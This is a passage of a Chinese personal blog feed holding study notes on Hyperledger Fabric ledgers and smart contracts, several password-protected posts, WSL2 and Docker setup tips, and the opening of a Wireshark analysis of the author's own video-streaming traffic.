alt="image.png"><br><em>一个智能合约定义在一个链码中。而多个智能合约也可以定义在同一个链码中。当一个链码部署完毕，该链码中的所有智能合约都可供应用程序使用。</em><br>从上图中我们可以看到，<code>vehicle</code> 链码包含了以下三个智能合约：<code>cars</code>、<code>boats</code> 和 <code>trucks</code>；而 <code>insurance</code> 链码包含了以下四个智能合约：<code>policy</code>、<code>liability</code>、<code>syndication</code> 和 <code>securitization</code>。以上每种智能合约都涵盖了与车辆和保险有关的业务流程的一些关键点。在本主题中，我们将以 <code>car</code> 智能合约为例。我们可以看到，智能合约是一个特定领域的程序，它与特定的业务流程相关，而链码则是一组相关智能合约安装和实例化的技术容器。</p><h1 id="账本"><a href="#账本" class="headerlink" title="账本"></a>账本</h1><p>以最简单的方式来说，区块链记录着更新账本状态的交易，且记录不可篡改。智能合约以编程方式访问账本两个不同的部分：一个是<strong>区块链</strong>（记录所有交易的历史，且记录不可篡改），另一个是<strong>世界状态</strong>（保存这些状态当前值的缓存，是经常需要用到的对象的当前值）。<br>首先，<strong>世界状态</strong>是一个数据库，它存储了一组账本状态的<strong>当前值</strong>。通过世界状态，程序可以直接访问一个账本状态的当前值，不需要遍历整个交易日志来计算当前值。默认情况下，账本状态是以<strong>键值</strong>对的方式来表示的。因为我们可以创建、更新和删除状态，所以世界状态能够频繁更改。<br>其次，<strong>区块链</strong>是交易日志，它记录了促成当前世界状态的所有改变。交易被收集在附加到区块链的区块中，能帮助我们理解所有促成当前世界状态的改变的历史。区块链数据结构与世界状态相差甚远，因为一旦把数据写入区块链，就无法修改，它是<strong>不可篡改的</strong>。<br><img src="https://image.hackerjerry.top/Deep-understanding-of-intelligent-contracts-3.png#align=left&display=inline&height=292&margin=%5Bobject%20Object%5D&name=image.png&originHeight=345&originWidth=804&size=50947&status=done&style=none&width=680" alt="image.png"><br><em>账本 L 由区块链 B 和世界状态 W 组成，其中世界状态 W 由区块链 B 决定。我们也可以说世界状态 W 是源自区块链 B。</em><br>智能合约主要在世界状态中将状态<strong>写入</strong>（put）、<strong>读取</strong>（get）和<strong>删除</strong>（delete），还可以查询不可篡改的区块链交易记录。</p><ul><li><strong>读取（get）</strong> 操作一般代表的是查询，目的是获取关于交易对象当前状态的信息。</li><li><strong>写入（put）</strong> 操作通常生成一个新的业务对象或者对账本世界状态中现有的业务对象进行修改。</li><li><strong>删除（delete）</strong> 操作代表的是将一个业务对象从账本的当前状态中移除，但不从账本的历史中移除。</li></ul><p>智能合约有许多可用的 <a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/developapps/transactioncontext.html#structure">API</a>。但重要的是，在任意情况下，无论交易创建、读取、更新还是删除世界状态中的业务对象，区块链都包含了这些操作的记录，且<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/ledger/ledger.html">记录不可更改</a> 。</p><h2 id="世界状态"><a href="#世界状态" class="headerlink" title="世界状态"></a>世界状态</h2><p>世界状态将业务对象属性的当前值保存为唯一的账本状态。这很有用，因为程序通常需要对象的当前值，如果遍历整个区块链来计算对象的当前值会很麻烦——从世界状态中可以直接获取当前值。<br><img src="https://image.hackerjerry.top/Deep-understanding-of-intelligent-contracts-4.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=863&size=90524&status=done&style=none&width=677" alt="image.png"><br><em>一个账本世界状态包含两个状态。第一个状态是： key=CAR1 和 value=Audi。第二个状态中有一个更复杂的值：key=CAR2 和 value={model:BMW, color=red, owner=Jane} 。两个状态的版本都是 0。</em><br>账本状态记录了一组与特定业务对象有关的事实。我们的示例展示的是 CAR1 和 CAR2 这两辆车的账本状态，二者都各有一个值和一个键。应用程序可以调用智能合约，该合约使用简单的账本 API 来<strong>获取</strong>、<strong>写入</strong>和<strong>删除</strong>状态。注意状态值可以是简单值（Audi…），也可以是复合值（type:BMW…）。经常会通过查询世界状态来检索具有某些特定属性的对象，例如查找所有红色宝马汽车。<br>应用程序提交那些会更改世界状态的交易，这些交易最终被提交到账本区块链上。应用程序无法看到 Hyperledger Fabric SDK（软件开发工具包）设定的<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/txflow.html">共识机制</a>的细节内容，它们能做的只是调用智能合约以及在交易被收进区块链时收到通知（<strong>所有被提交的交易，无论有效与否，都会被收进区块链</strong>）。Hyperledger Fabric 的关键设计在于，只有那些受到相关<strong>背书组织签名</strong>的交易才会更新世界状态。<br>您还会注意到，每个状态都有一个版本号，在上面的图表中，状态 CAR1 和 CAR2 都处于它们的初始版本 0。版本号是供 Hyperledger Fabric 内部使用的，并且每次状态更改时版本号会发生递增。每当更新状态时，都会检查该状态的版本，以确保当前状态与背书时的版本相匹配。这就确保了世界状态是按照预期进行更新的，没有发生并发更新。<br>最后，首次创建账本时，世界状态是空的。<strong>因为区块链上记录了所有代表有效世界状态更新的交易，所以任何时候都可以从区块链中重新生成世界状态。</strong>这样一来就变得非常方便，例如，<strong>创建节点时会自动生成世界状态</strong>。此外，如果某个节点发生异常，<strong>重启该节点时能够在接受交易之前重新生成世界状态</strong>。</p><h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><p>世界状态存储了与业务对象当前状态相关的事实信息，而区块链是一种历史记录，它记录了这些业务对象是如何到达各自当前状态的相关事实。<strong>区块链记录了每个账本状态之前的所有版本以及状态是如何被更改的。</strong><br><strong>区块链的结构是一群相互链接的区块的序列化日志，其中每个区块都包含一系列交易，各项交易代表了一个对世界状态进行的查询或更新操作。</strong></p><blockquote><p>在这里，官方提到了一个排序服务。<br>其中重要的是<strong>区块排序以及区块内的交易排序</strong>，这一机制是在 Hyperledger Fabric 的<strong>排序服务</strong>组件首次创建区块时被建立起来的。</p></blockquote><p>每个区块的头部都包含区块交易的一个哈希，以及前一个区块头的哈希。这样一来，账本上的所有交易都被按序排列，并以密码方式连接在一起。这种哈希和链接使账本数据变得非常安全。即使某个保存账本的节点被篡改了，该节点也无法让其他节点相信自己拥有“正确的”区块链，这是因为账本被分布在一个由独立节点组成的网络中。<br><strong>区块链总是以文件实现</strong>，而与之相反的是<strong>，世界状态以数据库实现</strong>。这是一个明智的设计，因为区块链数据结构高度偏向于非常小的一组简单操作。第一项操作被放在区块链的末尾，就目前来说，查询操纵相对少见。</p><p>当<strong>应用程序需要访问账本和链码的时候</strong>，他们总是需要连接到 Peer 节点。Hyperledger Fabric SDK 将这个操作变得非常简单，它的 API 使应用程序能够连接到 Peer 节点，<strong>调用链码生成交易，提交交易到网络，在网络中交易会被排序并且提交到分布式账本中</strong>，并且在这个流程结束的时候接收到事件。<br><strong>！不过，我们注意到 xuperchain 在文档中提到了使用 JDK 通过</strong><a href="https://xuper.baidu.com/n/xuperdoc/development_manuals/XuperRPC.html#id1"><strong>rpc 接口</strong></a><strong>构造交易发布！</strong><br><strong>目前需要知道：</strong></p><ul><li>智能合约发布的交易，发布方地址是什么，接收方地址是什么，他们在链上存储的和普通交易是否有区别？</li><li>在搞清问题 1 之后，是否有可能构造交易，把添加自定义字段，然后使用 rpc 接口发布？</li><li>因为区块链链式结构只需要将上一个区块的 hsah 包含在本区块头中，而 DAG 则将多个（至少两个块作为前置块，那么它们是如何连接的）</li></ul><hr><p>补充一个：<br>【1】快照链<a href="https://github.com/vitelabs/go-vite/blob/master/ledger/chain/block/snapshot_block.go">https://github.com/vitelabs/go-vite/blob/master/ledger/chain/block/snapshot_block.go</a><br>【2】真正的 DAG？<a href="https://github.com/vitelabs/go-vite/blob/master/ledger/chain/chain.go">https://github.com/vitelabs/go-vite/blob/master/ledger/chain/chain.go</a><br>【3】靠谱一点的白皮书<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616644033176-46652e0d-d91b-41c0-823a-ee503f7d8264.pdf?_lake_card=%7B%22uid%22:%221616644031374-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616644033176-46652e0d-d91b-41c0-823a-ee503f7d8264.pdf%22,%22name%22:%22vite_cn.pdf%22,%22size%22:1164591,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22N6Qwn%22,%22card%22:%22file%22%7D">vite_cn.pdf</a><br>【4】xuper 里的交易定义<a href="https://github.com/xuperchain/xuperchain/blob/7de83707283ba872129d66aa5e4435d04ed67bee/core/cmd/cli/types.go">https://github.com/xuperchain/xuperchain/blob/7de83707283ba872129d66aa5e4435d04ed67bee/core/cmd/cli/types.go</a><br>【5】xuper 的快照链<a href="https://github.com/xuperchain/xuperchain/blob/9d9e60a3bcd87bafafdac51784b504a310ead3d7/core/xmodel/xmodel.go#L51">https://github.com/xuperchain/xuperchain/blob/9d9e60a3bcd87bafafdac51784b504a310ead3d7/core/xmodel/xmodel.go#L51</a><br>【6】<a href="https://www.jianshu.com/p/8734e06d558f">GHOST，DAG，SPECTRE，PHANTOM 和 CONFLUX 技术原理</a>–挺全的<br>【7】<a href="https://confluxnetwork.org/zh/developers/assets">https://confluxnetwork.org/zh/developers/assets</a>–conflux 区块链，清华自研，树形结构，网站挺好的，白皮书也行</p><p><img src="https://image.hackerjerry.top/Deep-understanding-of-intelligent-contracts-5.png#align=left&display=inline&height=362&margin=%5Bobject%20Object%5D&name=image.png&originHeight=724&originWidth=1419&size=128783&status=done&style=none&width=709.5" alt="image.png"><br>【8】conflux 的白皮书<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616675325254-7b3d2143-8a29-4ae3-979b-0da2ca0b759e.pdf?_lake_card=%7B%22uid%22:%221616675322385-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616675325254-7b3d2143-8a29-4ae3-979b-0da2ca0b759e.pdf%22,%22name%22:%22Conflux_Technical_Presentation_whitepaper.pdf%22,%22size%22:1899775,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22DpkoK%22,%22card%22:%22file%22%7D">Conflux_Technical_Presentation_whitepaper.pdf</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Project-Implementation</title>
    <link href="/2021/03/20/Project-Implementation_new/"/>
    <url>/2021/03/20/Project-Implementation_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6019c468f4888e68574d875a2af9ed9f18bf151ae1177a7db5076f9b7d8954a1">760f982ea218ceab0ac94960889a6b3e60fe4ba2ced4721b519cbf7442a63b9d1d389686310409434dc6f557d77908efa0f2136993caa8347bfb0ca7020750654b74df3407a2f6acfae8f2d3d0ad4f39b757c95e43e5808f1379ed54f62bab4419599040235710351ca2ded5c01cdd0685a13f638251b015a4f07a46d0db4b2294626545dfd8b2935c889cf36256a6ba4b7921ce469e98d313c54e882147cf809ddb9837b9090825e1b563ff3d41e06676491813de5229cd75df217b81ed4075a2e4bef23beed54df8d4781b583f24441a2d1284b9b74527c179d3daf3acf8a5432b085ebfe38f3f3b44b850dd19acdec4cee057233a9537c43b946df67a6b15dca6e8c4ea6725aa3b988653edb69d7710f65cb3feb98ef4241be63ae079c21ccb094e43034788f646555a49b8cb3ab8b65a3173ab537ffe22028848e33297eafcd5076d72ef5a14783e9bd7da62015a97ec0fadefa9026bf496c0327501eaffa04b04d14912795c6f7c40f0b8363ad315e9c5df0e412ccfb2b53add680a97ba322699cfe1b1290c12a37feed35ddd20ed6faa670b864bee21d5ac6ce085ba450b71b814ab5d13e6fce5a4900c2238317e43cfb7c75032515856a5fb9dd92511056c510e387526a9bf2002ec7d72f2b3fbb25b4c7a24c8db33546a3419f676629e55c20fd6cc16db7a4d3a81178c0366925c929ffa2727c05a8c80d9f2c7e87962fb9e2bfe4bcd6742311d32bf222ee28866934af4424af3da978e116bdcaf9ebfa972023f44dd0e6926105a3eca387e900aef81727ec9b6daba18d1ac504bdf049da02db3d87d64d1a081a2ccbd05edb3991d4694f5108343a24c5dd5fec37796c5883e604fad779087f381bdd364a6bda158b6f11b90524de510dff6eb42a6dda6f15313387ee8e083d1dc0ac7c95f1fae11f680ee380309715ac74ab3c81771880d060e35cba58904aca2d289b0b83d052599302c7e0062b70e7ed02bbb4bce65d9a760aba0c983f4c5af15e977bfd06a2e99a174b53a9e2ab48fc5f5b6d5a0fcd7e55df8e9dc259dddf177531a25c58131449c64f96ee707f858c0da75a23852136c11cc8ca8320404ce7d4c00dd52dee491c38bf6be312306971f69b36ff793eacccde92daf7316128ead7b721c89de9c9aa37182c06ce619aff0d7bde3a050dd5caa628a97591f0bf89c7b56a86698fc2be6b875f6e939ae144e15c85b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XuperChain</title>
    <link href="/2021/03/17/XuperChain_new/"/>
    <url>/2021/03/17/XuperChain_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b4d499add0600f19a6fe3208514b10672c104071a00a62f1478703cff5e2caf9"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>A-glimpse-of-smart-contracts</title>
    <link href="/2021/03/17/A-glimpse-of-smart-contracts_new/"/>
    <url>/2021/03/17/A-glimpse-of-smart-contracts_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7781d9273ea2a8dbe14ee61a5d64a778c8bd108512fe32dff1f1c7cba834b9a8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Build-xuperchain</title>
    <link href="/2021/03/15/Build-xuperchain_new/"/>
    <url>/2021/03/15/Build-xuperchain_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f1857fc226844090749054fb565724f635e48d10d52d7c2f28479060b3de6daa"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Reinstall-WSL2-and-docker</title>
    <link href="/2021/03/14/Reinstall-WSL2-and-docker_new/"/>
    <url>/2021/03/14/Reinstall-WSL2-and-docker_new/</url>
    
    <content type="html"><![CDATA[<p>装机一时爽，重装 xxx。</p><a id="more"></a><h1 id="装-wsl2"><a href="#装-wsl2" class="headerlink" title="装 wsl2"></a>装 wsl2</h1><p>首先，这个不要在 MS 里安装，因为默认是 C 盘，当然，如果你 C 盘很大但我没说。<br>如果安在 C 盘可以通过导出到别的盘，就是有点耗时间。<br>在这里，参考<a href="https://zhuanlan.zhihu.com/p/263089007">https://zhuanlan.zhihu.com/p/263089007</a>，可以直接下载对应的安装包，然后自定义路径，非常方便了。<br>然后安装镜像快照，防止由于 upgrade 导致的崩溃。<br>我尝试安装了了 timeshift<br><a href="https://zhuanlan.zhihu.com/p/94105263">https://zhuanlan.zhihu.com/p/94105263</a><br><a href="https://prpr.fr/2020/04/01/2020-04-01-1/">https://prpr.fr/2020/04/01/2020-04-01-1/</a><br>但是在使用命令行的时候，检查不到盘符？？<br><img src="https://image.hackerjerry.top/Reinstall-WSL2-and-docker-1.png#align=left&display=inline&height=132&margin=%5Bobject%20Object%5D&name=image.png&originHeight=264&originWidth=517&size=267348&status=done&style=none&width=258.5" alt="image.png"><br>尬住，于是我又好一顿查。<br>在 wsl 的官方仓库中，有人在 2017 年就提出了这个问题<a href="https://github.com/microsoft/WSL/issues/2147">https://github.com/microsoft/WSL/issues/2147</a>，但是官方的回答是，没有计划。无 fuck 说。<br>网上找了一顿，没有相关教程，随作罢，只能<strong>禁用 upgrade!!!!!</strong></p><p>然后需要，添加源！而非全部替换成阿里的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo nano /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse<br></code></pre></td></tr></table></figure><h1 id="su-root-认证失败如何解决"><a href="#su-root-认证失败如何解决" class="headerlink" title="su root 认证失败如何解决"></a>su root 认证失败如何解决</h1><p>刚开始安装虚拟机操作系统时，可能会遇到 su root 认证失败的情况，这是因为 root 没有初始化，初始化的步骤如下：ctr+Alt+T 打开终端，然后输入 sudo passwd(不是 password) root，之后会提示 Enter new UNIX password: 输入新密码，然后提示 Retype new UNIX password: 再次输入上次输入的密码就 OK 了<br>————————————————<br>版权声明：本文为 CSDN 博主「四季帆」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_41076734/article/details/79518361">https://blog.csdn.net/qq_41076734/article/details/79518361</a></p><h1 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h1><p><a href="https://www.jianshu.com/p/a20c2d58eaac?utm_campaign=haruki">https://www.jianshu.com/p/a20c2d58eaac?utm_campaign=haruki</a></p><h1 id="终端快捷键"><a href="#终端快捷键" class="headerlink" title="终端快捷键"></a>终端快捷键</h1><p><img src="https://image.hackerjerry.top/Reinstall-WSL2-and-docker-2.png#align=left&display=inline&height=423&margin=%5Bobject%20Object%5D&name=image.png&originHeight=845&originWidth=1453&size=1899574&status=done&style=none&width=726.5" alt="image.png"><br>分屏快捷键如下：</p><ul><li>水平分屏：Alt + Shift + 减号</li><li>垂直分屏：Alt + Shift + 加号</li><li>切换聚焦的分屏视图：alt + (left/right/up/down)</li><li>调节分屏的窗口大小：alt + shift + (left/right/up/down)</li><li>缩放当前视图：Ctrl+ 加号/减号 （或者 Ctrl + 鼠标滚轮）<blockquote><p>那我不想分屏，我要删掉一个怎么办？ 这个问题问的好，直接输入 exit 即可退出分屏</p></blockquote></li></ul><h1 id="运行-GUI-程序"><a href="#运行-GUI-程序" class="headerlink" title="运行 GUI 程序"></a>运行 GUI 程序</h1><p>VcXsrv 差评，步骤太多，关键还有问题，它透不过防火墙，因为防火墙里就找不到这个东西！！！！<br>明显人就傻了。<br>但是，机智如我，在 b 站找到了新的教程，MobaXterm，新宠，无敌。<br><a href="https://www.bilibili.com/read/cv6585580/">https://www.bilibili.com/read/cv6585580/</a><br>效果如下：<br><img src="https://image.hackerjerry.top/Reinstall-WSL2-and-docker-3.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=796&originWidth=1319&size=148374&status=done&style=none&width=659.5" alt="image.png"><br>真的简单，巨省事儿。谢谢作者！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Homogenous-encryption</title>
    <link href="/2021/02/23/Homogenous-encryption_new/"/>
    <url>/2021/02/23/Homogenous-encryption_new/</url>
    
    <content type="html"><![CDATA[<p>同态加密</p><a id="more"></a><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><p>【1】<a href="https://github.com/tencentyun/qcloud-documents/blob/master/product/%E5%8C%BA%E5%9D%97%E9%93%BE/TBaaS/%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/Hyperledger%20Fabric%20%E5%90%88%E7%BA%A6/GO%20%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E6%94%AF%E6%8C%81.md">GO 智能合约同态加密支持</a>– paillier 包是根据轻量同态加密 Paillier 算法实现的<br>【2】<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1614060520927-99055406-4730-4010-956c-b77e9f7dd316.pdf?_lake_card=%7B%22uid%22:%221614060518504-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1614060520927-99055406-4730-4010-956c-b77e9f7dd316.pdf%22,%22name%22:%22%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%B5%E5%AD%90%E5%81%A5%E5%BA%B7%E8%AE%B0%E5%BD%95%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E6%96%B9%E6%A1%88.pdf%22,%22size%22:2016593,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22LLbwX%22,%22card%22:%22file%22%7D">基于区块链和同态加密的电子健康记录隐私保护方案.pdf</a><br>【3】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/dev/docs/articles/3_features/38_privacy/privacy_protection_homomorphic_encryption.html">链上密文参与计算？同态加密尽显神通 | FISCO BCOS 隐私特性</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pyramid-space-encoding</title>
    <link href="/2021/02/22/Pyramid-space-encoding_new/"/>
    <url>/2021/02/22/Pyramid-space-encoding_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6f8dd0ebd0b5151d12a5f7c0a88dbb13c2be459f47b97e0dda5d35aa9cab8c4b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MCM-Post-Competition-Summary</title>
    <link href="/2021/02/17/MCM-Post-Competition-Summary_new/"/>
    <url>/2021/02/17/MCM-Post-Competition-Summary_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="418ec512379f3d8a17628f703531e3e1d91386cb9735a4ab5e3e078d2dedc932">a878aca5d3b74c79800e37344b48042a3a0d18554ca21b5fd44c4d78137a316babb46472e9e3c4f755bacbb652b3430253655000fdeb7e959a657e3a9b050071912b5febe9679c83972b4d8edb9cfdb0bf46c25efdbf3ae545b93b5a29eb74d99a885d5df78a2cb6293e9e07f9883c33d9ed0fbd23e6eab0a3938275447c858465831d943441e3dd745cbb40db1150b44a9c2c52e76dc2226001d100703e8dd92d46d517a81bda16fd2851d02a061ede99f5dd25cb7854cea96f1c8ca504e13c77d189daa18ecbc891108be2e7cad89e6f92ae8f2a029bac6af1210637a925802f6ead7b4e147859c847ef33906b7447d7d093375f04bda88b2f838068f0547af55f61d3b786830f3afef1920ae0e23eab0b38fa0b78f09852eec6885e8e99770dc7e7bbc64aad1f946266481e455a0ef2622c08e648d559cd699427720b4179b307360941bed5dbff1fa6337d05a6fe8af779a86746549a0b2a02951f3f09573e42c7c016e3763abd69ae6f4877d5ec1bfdcd18c31edd8369466f56bbdda5f911d71531a51ecc1e515b5203fa4f3637da658df2a90f26582ead62ae67d7d1c85f374e6913ab035aac483ce1b982930d0a3cf981835c7de6aedf7145a0729b6bf10f45e6a44680d75ef3dd253b09da4dab350ca34a3afe77639bb605802cfb20d3953079a22c0c4d0acd530f2e03de5dd9bef59f228f29e3a5125c5fed03fd3c71596a99f64bd775f17241ac5d68c2e5b94837724a4d3c7e01c51bf4572f0b428b395c52e04ca58432b2846cb76710c2b01855e74fba759ca4df34f3e25d631cd005ad9fd8779a37359afd7f4a78b219bf530557d3dbbc0fa4ead2d8108e39fae3d52e7ae900a9a42e145e39686830f3c52ec20d572fb9739e71ebdf97f3961a41a58a08fc1a32dd7e0612c68a6fa4392f5619ef5e5cd75c908136923ce12ae9edb22174a3630eb722e4e0ceb6c1b044fa75f74367765aaff7eeff84d616d50f89fef743b1cef70bb55c0e7d6cea93b4f36d3696624f950ccad4c5c9d633d6fbd2da0294fd9d7b702914d23776d74f1e9fa9602eb35d3d5649b0a460bbd70f0cd5a264353f09e2a9b9f0322d4be48dc1360e45955dd9b58c57b670b4f1f3b53d998cbf2e693ad7e368405b789e325e9f1b7f3b55d2d0fb72780a0376f7cd825d3e5a642efc346bfd195495b9a8f4a035824582c4dd66e3b5945f1421961486bddfcd9f0131c4a204f0d6444cb9b943f3231058cd7f73c663b3231247ed18e1b6810ee3b9b998e04090116147acdee7a6d0949c21fef93c948348e92365c48316c080ea540d5de126d33eee8e53fbc394071a21896fb913bd33cfd74e47a15ede594931846cd793dcfcce419894e8d8f5cc1e53d477759662c34edd3f916c5d0ca51fb16c1ab9bfb49783be6e96220a4cc430bf001fb01b007e77f9d90a23213734e2295d2b16e4ab9b284285a8c856f8d0712de8fbcdd518500e69932b60517a82588b8d05ddbcd1bcd000f39450448e73e175d05b1c4718287ded9fcebd41e916e455984a6132e4832d1d0f29ffc145482c159b1479e25f2fe9984e8a5be9cf4a355e98f1625db7533de3a2d8393472ee561b212d84f8f83a89ffbfb2606c5cf4b2c016d17a6c5c755d215accaa1919234c1521f5a84b4d005df458da5ca73deeb725489cdadfe2b9c87e580cfef588573c04088eaf403e231fe195d19bc0bec6e8e9c6f14a86ad5eee7a66645ebae38457272f881707428e5fe023fa602bacb15dc4b003ef37fb957566b82abec5a5038566e865afeb41ab6ee14b454b31254f3b7c6e98b14c806dab9a4b0b4b94d2ec611f7a5ba203054b5e7058ececc740ab277771ddd47a2e8a398b71494ec49121b0cb00e9c0967a09dfe7b1f1297016b24026a019a49bfbe2927bdb7ba9b8d99708b833c22258e11ebaecef3068343ed4ca7058f6560a19d4fd63549863e8477b5ce9619a17790b2669398193bebf3ec6d5993b41f4b04c5440aa92a7dc68aca6d9ea43fd787c1a874d7e794fd00381c47f342483b47847124cd63eb5424d94</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>绘图</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>绘图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Analysis-video-traffic-with-wireshark</title>
    <link href="/2021/02/16/Analysis-video-traffic-with-wireshark_new/"/>
    <url>/2021/02/16/Analysis-video-traffic-with-wireshark_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在本次分析中，我选择了腾讯视频流量进行抓包分析。<br>首先，腾讯视频的流量是走的 tcp 协议，而且全站 https 加密，因此报文内容是乱码，需要解码。<br>以 windows 系统+Chrome 浏览器为例，首先要导出浏览器存储的密钥，通过计算机属性——高级系统设置——环境变量，新建一个变量名“SSLKEYLOGFILE”的变量，变量值是导出的密钥具体文件地址。<br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-1.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=522&size=201841&status=done&style=none&width=261" alt="image.png"><br>经测试，chrome 和 firefox 均无法导出密钥，最终找到解决办法如下。<br>运行命令</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span 